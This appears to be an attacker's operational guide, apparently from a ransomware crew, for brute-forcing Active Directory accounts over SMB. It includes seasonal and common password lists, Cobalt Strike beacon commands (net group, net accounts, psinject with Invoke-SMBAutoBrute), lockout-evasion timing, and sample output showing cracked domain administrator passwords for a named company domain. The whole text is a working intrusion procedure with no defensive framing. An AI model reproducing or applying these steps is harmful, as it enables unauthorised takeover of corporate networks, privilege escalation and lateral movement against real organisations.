# SMB AUTOBRUT
The input data for carrying out this attack are only passwords.
   - those that dumped from the CharpChrome browser
   - those that were dumped by SeatBeltom
   - those that dumped in the process of work inside the network (mimikatts, etc.)
And in general any others, for example, found recorded in files
   
If there are fewer such passwords than we can launch a brute-force attack, we can safely supplement them from the following list of the most commonly encountered in the corporate environment.
```
Password1
Hello123
password
Welcome1
banco@1
training
Password123
job12345
spring
food1234
```

We also recommend using password lists based on the seasons and the current year. Considering that passwords are changed every three months, you can take a "reserve" to generate such a sheet.
For example, in August 2020, we create a list with the following content
```
June2020
July2020
August20
August2020
Summer20
Summer2020
June2020!
July2020!
August20!
August2020!
Summer20!
Summer2020!
```
All passwords above fall either into 3 out of 4 requirements for Active Directory passwords (which is enough for users to set them), or into all 4 requirements.
Approx. we consider the most popular option of requirements.


   
   Domain Admins Scenario
1. We collect the list of domain administrators with the command shell net group "domain admins" / dom
   We write the received data to a file
   admins.txt
2.   We upload this file to the host in the folder C:\ProgramData
3.   We request information on the domain account blocking policy (protection against brute force)
   beacon> shell net accounts /dom
   

    Tasked beacon to run: net accounts /dom
    host called home, sent: 48 bytes
    received output:


   The request will be processed at a domain controller for domain shookconstruction.com.
   Force user logoff how long after time expires?:       Never
   Minimum password age (days):                          1
   Maximum password age (days):                          42
   Minimum password length:                              6
   Length of password history maintained:                24
   Lockout threshold:                                    Never
   Lockout duration (minutes):                           30
   Lockout observation window (minutes):                 30
   Computer role:                                        BACKUP

We are interested in the Lockout threshold parameter, which most often contains a certain numerical value that we must use later as a parameter (in this case, it is Never, which means that protection against brute-force passwords is disabled.
   In this guide, in the future, we will indicate the value 5 as roughly the most common.
   The Minimum password length parameter indicates the minimum allowed number of password characters required to filter our "list" of passwords that we will set.
   
4. In the source code of the script, specify the domain in which the script will run
   -   line            $context = new-object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain","shookconstruction.com")

5.   Importing and running the script
   powershell-import /tmp/Fast-Guide/Invoke-SMBAutoBrute.ps1
   psinject 4728 x86 Invoke-SMBAutoBrute -UserList "C:\ProgramData\admins.txt" -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5 -ShowVerbose
   -   4728 in this case, this is the current pid, and x86 is its bit depth
   - The list of passwords consists of one which we had "found" and two from the list of popular passwords
   
6. We look at the progress of the script and see the result
   

    Success! Username: Administrator. Password: 1qazXDR%+
    Success! Username: CiscoDirSvcs. Password: 1qazXDR%+


We got two domain administrators out of the way.
   
================================================== =======================
   
   The scenario without specifying a list of users differs in only two ways.
   - psinject 4728 x86 Invoke-SMBAutoBrute -PasswordList "Password1, Welcome1, 1qazXDR% +" -LockoutThreshold 5
      We do not specify the UserList and ShowVerbose parameters. The absence of the first means that the search will be performed on ALL domain users, the absence of the second means that only SUCCESSFUL results will be displayed.
   
   I will not wait in the video guide for the end of the script that will go through all user / password pairs in the domain, I will only show the output.


    Success! Username: Administrator. Password: 1qazXDR%+
    Success! Username: CiscoDirSvcs. Password: 1qazXDR%+
    Success! Username: support. Password: 1qazXDR%+
    Success! Username: accountingdept. Password: 1qazXDR%+   


   
   As you can see, we were able to find accounts of other users that may be useful for further promotion on the network and raising rights.

   If there is no positive result, you can repeat it after a while (it is optimal to multiply the Lockout duration parameter by two before the next attempt) with a new list of passwords.
   The end of the script will be marked by outputting a message to the beacon
